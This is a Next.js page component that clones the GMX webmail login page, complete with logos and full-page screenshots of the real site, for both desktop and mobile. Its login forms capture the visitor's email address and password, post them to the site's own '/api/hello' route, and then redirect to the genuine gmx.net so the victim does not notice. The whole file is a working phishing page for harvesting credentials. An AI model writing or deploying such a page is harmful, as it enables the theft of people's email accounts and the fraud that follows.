import Image from "next/image"
import webde from "../public/gmxmoblielogo.jpeg"
import webmo from "../public/gmxapp.jpeg"
import gmx from "../public/gmx-logo.png"
import loginIcon from "../public/loginn.png"
import screenshot1 from "../public/Lcreenshot1.png"
import screenshot2 from "../public/Screenshot2.png"
import screenshot3 from "../public/Screenshot3.png"
import screenshot4 from "../public/Screenshot4.png"
import screenshot5 from "../public/Screenshot5.png"
import screenshot65 from "../public/Screenshot6-5.png"
import screenshot6 from "../public/Screenshot6.png"
import screenshot7 from "../public/Screenshot7.png"
import footerr from "../public/footer.png"
import Advert from "../components/advert"
import WebFooter from "../components/webfooter"
import axios from "axios"
import { useRef, useState } from "react"
import { FormEvent, ChangeEvent } from "react"

type Form = {
   email: string;
   passwort: string
}

export default function Main() {


  const picks = ['Email & Cloud', 'Mobilfunk & DSL', 'Strom & Gas', 'Shop', 'Lotto', 'Versicherung', 'WEB.Cent', 'Games' ]
  
  const passwordInput = useRef<HTMLInputElement>(null)

  const passwordInputWeb = useRef<HTMLInputElement>(null)

  const [credentials, setCredentials] = useState<Form>({email: '', passwort: ''})

  console.log(credentials);
  

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    let name = e.target.name 
    let value = e.target.value

    setCredentials({...credentials, [name]: value})
  }

  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()

    const data = {
      email: credentials.email,
      password: credentials.passwort
    }

    axios.post('/api/hello', data)
    .then((req) => {
      console.log(req.data);
      setCredentials({passwort: "", email: ""})
      window.location.href = 'https://www.gmx.net'
    }).catch((err) => {
      console.log(err);

    })
  }
  

  const handleShow = () => {
    passwordInput.current!.type === "password" ? (
        passwordInput.current!.type = "text" 
    ) : (
        passwordInput.current!.type = "password" 
    )
  }

  const handleShowWeb = () => {
    passwordInputWeb.current!.type === "password" ? (
        passwordInputWeb.current!.type = "text" 
    ) : (
        passwordInputWeb.current!.type = "password" 
    )
  }

  return (
    <>
    <main className="bg-gray-100 min-w-[1230px] hidden md:flex flex-col items-center">
        <div className="bg-white w-11/12 min-h-screen">
         <div className="w-full h-1 bg-blue-850"></div>
         <div className="flex items-center bg-blue-850 justify-between">
            <Image
            src={gmx}
            alt="webde"
            height={100}
            width={100}
            className=" my-4 ml-9"
            />

            <div className="flex items-center w-5/12">
              <input type="text" placeholder="Suchen mit GMX" className="w-full placeholder:text-base h-10 saturate-100 hover:saturate-100 p-3 border rounded-l-md border-gray-300 focus:border-blue-850 hover:border-blue-850 trasition duration-300 ease-linear outline-none"/>
              <div className="h-10 w-10 rounded-r-md bg-lime-600 flex justify-center items-center">
               <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6 stroke-white">
                <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
                </svg>
              </div>
              
            </div>
           

            <button className="h-8 w-32 mr-3 transition duration-150 ease-in hover:bg-white hover:text-black border font-medium text-white border-white text-center outline-none rounded-md">
                Registrieren
            </button>

         </div>

         <div className="w-full flex items-center justify-between border border-gray-300 pl-4 py-1">
          <div className="flex items-center">
          <svg xmlns="http://www.w3.org/2000/svg" 
           
           fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6 mr-2">
            <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
            </svg>
            
            {picks.map((pick, index) => {
                return(
            <h1 className="px-3 hover:underline font-normal underline-offset-8 decoration-blue-850 cursor-pointer hover:decoration-4 text-sm text-gray-800" key={index}>
              {pick}
            </h1>
                )
            })}


            

          </div>

          <div className="flex space-x-5 mr-3">
            
              <img src="https://adimg.uimserv.net/otto/2021/210617/otto_logo_44x16-2.svg"></img>
           
              <img src="https://adimg.uimserv.net/MONA/2021/Promoline_12461_mona-56x16-1.svg"></img>

              <img src="https://adimg.uimserv.net/BaurVersand/210618/Promoline_baur-logo_56x16px-2.svg"></img>
            
          </div>

         </div>


         <div className="w-full mb-6 cursor-pointer">
          <Image
           src={screenshot1}
           alt="screenshot1"
           height={1200}
           width={1200}
           priority
           className="w-full"
          />

         </div>

         <div className="h-20 bg-gray-100 mx-2 flex items-center justify-center sticky top-0">
            <div className="flex items-center space-x-3">
               <svg viewBox="0 2 40 40" className="h-8 w-8" fill="#1C449B"><path d="M40 32V9.9v-.08L28.92 20.9zM11.1 20.92L0 9.82V32zM21.37 25.17L38.94 7.59a3.05 3.05 0 0 0-2-.78H3.09a3.05 3.05 0 0 0-2 .78l17.54 17.58a2 2 0 0 0 2.74 0z"></path><path d="M27.27 22.54L23 26.81a4.27 4.27 0 0 1-6 0l-4.25-4.25L.3 35a3.1 3.1 0 0 0 2.79 1.8h33.82a3.11 3.11 0 0 0 2.81-1.8z"></path></svg>
               <h1 className="font-light hidden lg:block text-2xl text-blue-850">
                E-Mail
               </h1>
              

              <form onSubmit={e => handleSubmit(e)} className="flex items-center space-x-5">
                
                <div className="flex flex-col">
                    <input type="text" 
                      name="email"
                      value={credentials.email} 
                     onChange={e => handleChange(e)} 
                    placeholder="E-Mail-Addresse" className="h-10 border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-blue-850 hover:border-blue-850 placeholder:hover:text-blue-850 trasition duration-300 ease-linear outline-none" 
                    required
                    />
                    <label htmlFor="email" className="text-xs text-gray-500">Kostenlos registrieren!</label>
                </div>

                <div className="flex flex-col relative">
                    <input type="text"
                    value={credentials.passwort}  
                     onChange={e => handleChange(e)}
                     ref={passwordInputWeb} name="passwort" placeholder="Passwort" className="h-10 border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-blue-850 placeholder:hover:text-blue-850 hover:border-blue-850 trasition duration-300 ease-linear outline-none"
                     required
                     />
                    <svg xmlns="http://www.w3.org/2000/svg" 
                      onClick={handleShowWeb}
                      viewBox="0 0 24 24" fill="#808080" className="w-4 h-4 cursor-pointer absolute right-3 top-3">
                        <path d="M12 15a3 3 0 100-6 3 3 0 000 6z" />
                        <path fillRule="evenodd" d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z" clipRule="evenodd" />
                        </svg>
                    <label htmlFor="email" className="text-xs text-gray-500">Passwort Vergessen?</label>
                </div>

               
              
                 <button 
                   type="submit"
                   className="bg-lime-600 text-white h-10 w-20 rounded-md hover:saturate-50 font-semibold mb-3">
                    Login
                 </button>

                 <Image
                    src={loginIcon}
                    alt="login"
                    height={150}
                    width={150}
                    className="mb-3 cursor-pointer"
                      />

              </form>
               
            </div>
         




          
         </div>
         
         <Advert src={screenshot2}/>
         <Advert src={screenshot3}/>
         <Advert src={screenshot4}/>
         <Advert src={screenshot5}/>
         <Advert src={screenshot65}/>

         <WebFooter src={screenshot6}/>
         <WebFooter src={screenshot7}/>

         <div className="w-full cursor-pointer">
          <Image
           src={footerr}
           alt="footer"
           height={130}
           width={1000}
           className="w-full"
          />
          </div>
          
        </div>
  
    </main>

    <main className="w-screen min-h-screen md:hidden">
        
    <div className="w-full h-1 bg-blue-850"></div>

    <div className="border-b flex items-center bg-blue-850">
      <Image
        src={gmx}
        alt="gmx"
        height={80}
        width={80}
        className="my-2 ml-3"
        />   

        <h1 className="ml-4 font-light text-2xl text-white">
            Mobile Login
        </h1>
    </div>


    <div className="flex flex-col items-center">
      <Image
        src={webde}
        alt="webde"
        height={100}
        width={100}
        className="ml-3 my-8"
     /> 

      <h1 className=" ml-4 text-center mr-2 font-semibold text-xl text-gray-600">
         Login
     </h1>

     <div className="text-center my-7">

     <p className="text-gray-600">
      Bitte melden Sie sich hier mit Ihrer GMX E-mail-
     </p>

     <p className="text-gray-600">
      Adresse und Ihrem Passwort an.
     </p>

     </div>

     <form onSubmit={e => handleSubmit(e)} className="w-4/5 space-y-4">

        <div className="flex flex-col space-y-1">
            <label htmlFor="email" className="text-gray-600">
                GMX E-Mail-Adresse
            </label>
            <input 
               type="text"
               name="email"
               value={credentials.email}
               onChange={e => handleChange(e)}
               className="h-10 border rounded-md outline-none p-2 focus:border-blue-850"
               required
               />
        </div>

        <div className="flex flex-col space-y-1 relative">
            <label htmlFor="password" className="text-gray-600">
                Passwort eingeben
            </label>
            <input 
             type="password"
             name="passwort"
             value={credentials.passwort}
             onChange={e => handleChange(e)}
             ref={passwordInput} 
             className="h-10 border rounded-md outline-none p-2 focus:border-blue-850"
             required
             />

                <svg xmlns="http://www.w3.org/2000/svg" 
                onClick={handleShow}
                viewBox="0 0 24 24" fill="#808080" className="cursor-pointer w-5 h-5 absolute right-3 top-8">
                <path d="M12 15a3 3 0 100-6 3 3 0 000 6z" />
                <path fillRule="evenodd" d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z" clipRule="evenodd" />
                </svg>


        </div>

        <button type="submit" className="bg-lime-600 w-full h-8 rounded-md text-white">
            Login
        </button>

        <h1 className="text-blue-850 text-center mt-3">
            Passwort Vergessen?
        </h1>
     </form>

     <div className="h h-[1px] w-4/5 bg-gray-300 mt-10"></div>

     <h1 className="font-semibold mt-9">
        Neu bei GMX?
     </h1>

     <h1 className="text-blue-850 mt-5">
        Jetzt kostenlos registrieren!
     </h1>

     <Image
       src={webmo}
       alt="web-de"
       height={100}
       width={500}
       className="mt-8 h-32 w-2/3 mb-8"
     />

     

    </div>

    </main>
    
    </>
    
  )
}